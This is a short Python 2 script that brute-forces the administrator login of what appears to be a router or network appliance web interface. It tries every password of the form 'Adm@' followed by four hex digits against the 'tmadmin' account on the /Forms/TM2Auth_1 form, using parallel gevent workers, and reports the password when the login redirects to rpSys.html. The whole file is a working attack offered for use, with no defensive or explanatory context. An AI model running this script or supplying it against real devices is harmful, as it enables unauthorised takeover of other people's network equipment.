                             #!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import signal
import os
import requests
from requests.exceptions import ConnectionError

import gevent
from  gevent.queue import Queue

req = Queue()
success = False

def gene(x):
    num = len(hex(x).split('0x')[1])
    if num < 4:
        res = '0' * (4 - num) + hex(x).split('0x')[1]
    else:
        res = hex(x).split('0x')[1]
    return 'Adm@' + res.upper()

def task(target):
    global success
    while not req.empty() or success:
        content = gene(req.get())
        payload = {
            'LoginNameValue' : 'tmadmin',
            'LoginPasswordValue' : content, }

        try:
            r = requests.post('http://' + target + '/Forms/TM2Auth_1',
                             data=payload, allow_redirects=False,
                             timeout=60)
            location = r.headers['Location']
            print 'try {}'.format(content)
        except ConnectionError as e:
            print '{} is error'.format(str(content))

        if 'rpSys.html' in location:
            print 'Success!! Password is {}'.format(content)
            success = True

        gevent.sleep(0)

def scheduler():
    for i in xrange(65536):
        req.put_nowait(i)

if __name__ == '__main__' :
    target = str(sys.argv[1])
    if os.name == 'nt':
        gevent.signal(signal.SIGINT, gevent.kill)
    else:
        gevent.signal(signal.SIGQUIT, gevent.kill)
    gevent.spawn(scheduler).join()

    threads = [gevent.spawn(task, target) for i in xrange(10)]
    print str(threads)
    gevent.joinall(threads)
